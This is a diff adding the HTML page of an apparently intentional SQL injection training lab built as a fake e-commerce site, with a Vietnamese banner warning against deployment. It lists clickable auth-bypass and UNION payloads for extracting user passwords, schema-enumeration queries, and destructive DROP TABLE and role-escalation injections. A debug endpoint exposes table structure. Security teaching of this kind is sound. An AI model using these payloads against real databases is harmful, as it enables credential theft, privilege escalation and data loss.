@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔓 SQLi Lab - Vulnerable E-commerce</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', sans-serif; 
+            background: #1a1a2e; 
+            color: #eee; 
+            min-height: 100vh;
+        }
+        .warning-banner {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+        }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        h1 { color: #00ff88; margin-bottom: 10px; }
+        h2 { color: #ff6b6b; margin: 20px 0 10px; border-bottom: 1px solid #333; padding-bottom: 5px; }
+        
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px; }
+        
+        .card {
+            background: #16213e;
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid #0f3460;
+        }
+        .card h3 { color: #00d9ff; margin-bottom: 15px; }
+        
+        input, select, textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0 15px;
+            border: 1px solid #0f3460;
+            border-radius: 5px;
+            background: #0a0a1a;
+            color: #fff;
+        }
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #00ff88;
+        }
+        
+        button {
+            background: linear-gradient(135deg, #00ff88, #00d9ff);
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+        }
+        button:hover { opacity: 0.9; }
+        button.danger { background: linear-gradient(135deg, #ff6b6b, #ee5a24); }
+        
+        .result {
+            background: #0a0a1a;
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 15px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: 'Consolas', monospace;
+            font-size: 12px;
+            white-space: pre-wrap;
+        }
+        .result.success { border-color: #00ff88; }
+        .result.error { border-color: #ff6b6b; }
+        
+        .payload-hints {
+            background: #2a2a4a;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+            font-size: 12px;
+        }
+        .payload-hints code {
+            background: #000;
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: #ff6b6b;
+            display: block;
+            margin: 5px 0;
+            cursor: pointer;
+        }
+        .payload-hints code:hover { color: #00ff88; }
+        
+        .cheatsheet {
+            background: #16213e;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        .cheatsheet h3 { color: #ff6b6b; }
+        .cheatsheet ul { margin-left: 20px; margin-top: 10px; }
+        .cheatsheet li { margin: 5px 0; }
+        .cheatsheet code { 
+            background: #000; 
+            padding: 2px 6px; 
+            border-radius: 3px; 
+            color: #00ff88; 
+        }
+    </style>
+</head>
+<body>
+    <div class="warning-banner">
+        ⚠️ VULNERABLE APPLICATION - CHỈ DÙNG ĐỂ HỌC TẬP SQL INJECTION - KHÔNG DEPLOY LÊN INTERNET! ⚠️
+    </div>
+    
+    <div class="container">
+        <h1>🔓 SQL Injection Lab</h1>
+        <p>Thực hành khai thác lỗ hổng SQL Injection trên các form dưới đây</p>
+        
+        <div class="grid">
+            <!-- LOGIN FORM -->
+            <div class="card">
+                <h3>🔐 1. Login (Auth Bypass)</h3>
+                <form id="loginForm">
+                    <label>Username:</label>
+                    <input type="text" id="loginUsername" placeholder="admin">
+                    
+                    <label>Password:</label>
+                    <input type="text" id="loginPassword" placeholder="password">
+                    
+                    <button type="submit">Đăng nhập</button>
+                </form>
+                
+                <div class="payload-hints">
+                    <strong>💡 Thử các payload:</strong>
+                    <code onclick="setLogin(this.textContent)">admin'--</code>
+                    <code onclick="setLogin(this.textContent)">' OR '1'='1'--</code>
+                    <code onclick="setLogin(this.textContent)">' OR 1=1#</code>
+                    <code onclick="setLogin(this.textContent)">admin' OR '1'='1</code>
+                </div>
+                
+                <div id="loginResult" class="result"></div>
+            </div>
+            
+            <!-- SEARCH FORM -->
+            <div class="card">
+                <h3>🔍 2. Product Search (UNION Injection)</h3>
+                <form id="searchForm">
+                    <label>Tìm kiếm:</label>
+                    <input type="text" id="searchKeyword" placeholder="iPhone">
+                    
+                    <label>Sắp xếp theo:</label>
+                    <input type="text" id="searchSort" placeholder="price">
+                    
+                    <button type="submit">Tìm kiếm</button>
+                </form>
+                
+                <div class="payload-hints">
+                    <strong>💡 Thử các payload:</strong>
+                    <code onclick="setSearch(this.textContent)">' OR '1'='1</code>
+                    <code onclick="setSearch(this.textContent)">' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--</code>
+                    <code onclick="setSearch(this.textContent)">' UNION SELECT id,username,password,email,phone,role,1,1,1,1,1 FROM users--</code>
+                </div>
+                
+                <div id="searchResult" class="result"></div>
+            </div>
+            
+            <!-- USER PROFILE -->
+            <div class="card">
+                <h3>👤 3. User Profile (IDOR + SQLi)</h3>
+                <form id="userForm">
+                    <label>User ID:</label>
+                    <input type="text" id="userId" placeholder="1">
+                    
+                    <button type="submit">Xem thông tin</button>
+                </form>
+                
+                <div class="payload-hints">
+                    <strong>💡 Thử các payload:</strong>
+                    <code onclick="setUser(this.textContent)">1 OR 1=1</code>
+                    <code onclick="setUser(this.textContent)">1 UNION SELECT 1,2,3,4,5,6</code>
+                    <code onclick="setUser(this.textContent)">0 UNION SELECT id,username,password,email,phone,role FROM users</code>
+                </div>
+                
+                <div id="userResult" class="result"></div>
+            </div>
+            
+            <!-- ORDER LOOKUP -->
+            <div class="card">
+                <h3>📦 4. Order Lookup (Data Extraction)</h3>
+                <form id="orderForm">
+                    <label>Mã đơn hàng:</label>
+                    <input type="text" id="orderCode" placeholder="ORD001">
+                    
+                    <button type="submit">Tra cứu</button>
+                </form>
+                
+                <div class="payload-hints">
+                    <strong>💡 Thử các payload:</strong>
+                    <code onclick="setOrder(this.textContent)">' OR '1'='1</code>
+                    <code onclick="setOrder(this.textContent)">' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--</code>
+                </div>
+                
+                <div id="orderResult" class="result"></div>
+            </div>
+        </div>
+        
+        <!-- CHEATSHEET -->
+        <div class="cheatsheet">
+            <h3>📖 SQL Injection Cheatsheet</h3>
+            <div class="grid">
+                <div>
+                    <h4 style="color:#00d9ff; margin:10px 0">Authentication Bypass:</h4>
+                    <ul>
+                        <li><code>admin'--</code> - Comment out password check</li>
+                        <li><code>' OR '1'='1'--</code> - Always true condition</li>
+                        <li><code>' OR 1=1#</code> - MySQL comment</li>
+                        <li><code>admin'/*</code> - Block comment</li>
+                    </ul>
+                    
+                    <h4 style="color:#00d9ff; margin:10px 0">UNION Injection:</h4>
+                    <ul>
+                        <li><code>' UNION SELECT NULL,NULL,NULL--</code> - Find column count</li>
+                        <li><code>' UNION SELECT 1,2,3,4,5--</code> - Identify visible columns</li>
+                        <li><code>' UNION SELECT username,password FROM users--</code></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 style="color:#00d9ff; margin:10px 0">Information Gathering:</h4>
+                    <ul>
+                        <li><code>' UNION SELECT @@version,NULL--</code> - MySQL version</li>
+                        <li><code>' UNION SELECT database(),NULL--</code> - Current DB</li>
+                        <li><code>' UNION SELECT table_name,NULL FROM information_schema.tables--</code></li>
+                        <li><code>' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--</code></li>
+                    </ul>
+                    
+                    <h4 style="color:#00d9ff; margin:10px 0">Dangerous:</h4>
+                    <ul>
+                        <li><code>'; DROP TABLE users--</code> - Delete table</li>
+                        <li><code>'; UPDATE users SET role='admin'--</code> - Privilege escalation</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        
+        <!-- DEBUG INFO -->
+        <div class="card" style="margin-top: 20px;">
+            <h3>🔧 Database Structure</h3>
+            <button onclick="loadTables()">Load Tables Info</button>
+            <div id="tablesResult" class="result"></div>
+        </div>
+    </div>
+    
+    <script>
+        // Helper functions to set payloads
+        function setLogin(payload) {
+            document.getElementById('loginUsername').value = payload;
+        }
+        function setSearch(payload) {
+            document.getElementById('searchKeyword').value = payload;
+        }
+        function setUser(payload) {
+            document.getElementById('userId').value = payload;
+        }
+        function setOrder(payload) {
+            document.getElementById('orderCode').value = payload;
+        }
+        
+        // Format JSON
+        function formatResult(data, elementId, isError = false) {
+            const el = document.getElementById(elementId);
+            el.textContent = JSON.stringify(data, null, 2);
+            el.className = 'result ' + (isError ? 'error' : 'success');
+        }
+        
+        // LOGIN
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('loginUsername').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            try {
+                const res = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+                const data = await res.json();
+                formatResult(data, 'loginResult', !data.success);
+            } catch (err) {
+                formatResult({ error: err.message }, 'loginResult', true);
+            }
+        });
+        
+        // SEARCH
+        document.getElementById('searchForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const search = document.getElementById('searchKeyword').value;
+            const sort = document.getElementById('searchSort').value;
+            
+            try {
+                const res = await fetch(`/api/products?search=${encodeURIComponent(search)}&sort=${encodeURIComponent(sort)}`);
+                const data = await res.json();
+                formatResult(data, 'searchResult', !data.success);
+            } catch (err) {
+                formatResult({ error: err.message }, 'searchResult', true);
+            }
+        });
+        
+        // USER
+        document.getElementById('userForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const id = document.getElementById('userId').value;
+            
+            try {
+                const res = await fetch(`/api/users/${encodeURIComponent(id)}`);
+                const data = await res.json();
+                formatResult(data, 'userResult', !data.success);
+            } catch (err) {
+                formatResult({ error: err.message }, 'userResult', true);
+            }
+        });
+        
+        // ORDER
+        document.getElementById('orderForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const code = document.getElementById('orderCode').value;
+            
+            try {
+                const res = await fetch(`/api/orders/lookup?order_code=${encodeURIComponent(code)}`);
+                const data = await res.json();
+                formatResult(data, 'orderResult', !data.success);
+            } catch (err) {
+                formatResult({ error: err.message }, 'orderResult', true);
+            }
+        });
+        
+        // TABLES
+        async function loadTables() {
+            try {
+                const res = await fetch('/api/debug/tables');
+                const data = await res.json();
+                formatResult(data, 'tablesResult');
+            } catch (err) {
+                formatResult({ error: err.message }, 'tablesResult', true);
+            }
+        }
+    </script>
+</body>
+</html>
